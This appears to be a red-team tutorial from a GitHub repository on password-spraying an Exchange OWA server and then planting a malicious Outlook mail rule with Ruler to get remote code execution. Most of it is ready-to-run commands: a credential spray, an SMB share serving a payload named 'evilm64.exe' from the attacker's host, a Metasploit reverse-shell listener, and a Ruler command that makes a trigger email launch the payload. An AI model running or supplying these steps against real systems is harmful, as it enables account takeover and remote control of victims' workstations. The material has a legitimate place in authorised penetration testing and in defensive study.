# Password Spraying OWA to RCE


### Getting a Shell via Malicious Email Rule
If the password spray against an Exchange server was successful and you have obtained valid credentials, you can now leverage Ruler to create a malicious email rule to that will gain you remote code execution on the host that checks that compromised mailbox.

### A high level overwiew of how the spraying and remote code execution works:
1. assume you have obtained working credentials during the spray for the user `spotless@offense.local`.
2. with the help of Ruler, a malicious mail rule is created for the compromised account which in our case is `spotless@offense.local`. The rule created will conform to the format along the lines of:
`if emailSubject contains someTriggerWord start pathToSomeProgram`.
3. A new email with subject containing `someTriggerWord` is sent to the `spotless@offense.local`.
4. User spotless logs on to his/her workstation and launches Outlook client to check for new email.
5. Malicious email comes in and the malicious mail rule is triggered, which in turn starts the program specified in pathToSomeProgram which is pointing to a malicious payload giving a reverse shell to the attacker.

## How to Exploit

### Password Spraying
```bash
ruler -k --domain offense.local brute --users users --passwords passwords --verbose
```

### Getting a Shell via Malicious Email Rule
* Let's validate the compromised credentials are working by checking if there are any email rules created already:
```bash
ruler -k --verbose --email spotless@offense.local -u spotless -p 123456  display
```

* We now need to create an SMB share that is accessible to our victim host and point it to the location where our payload evilm64.exe is located:
```bash
smbserver.py tools /root/tools/
```

* Next, we setup a metasploit listener to catch the incoming reverse shell:
```bash
use exploit/multi/handler 
set lhost 10.0.0.5
set lport 443
exploit
```

* Finally, we fire up the ruler and create the malicious email rule:
```bash
ruler -k --verbose --email spotless@offense.local --username spotless -p 123456  add --location '\\10.0.0.5\tools\\evilm64.exe' --trigger "popashell" --name maliciousrule --send --subject popashell
```

<img src="https://github.com/Mehdi0x90/Red-Team/assets/17106836/640ebd5a-f763-4916-a76d-260cf9fe2fd5" width="400" height="500">


* If you want to delete the malicious email rule, do this:
```bash
ruler -k --verbose --email spotless@offense.local --username spotless -p 123456 delete --name maliciousrule
```















































































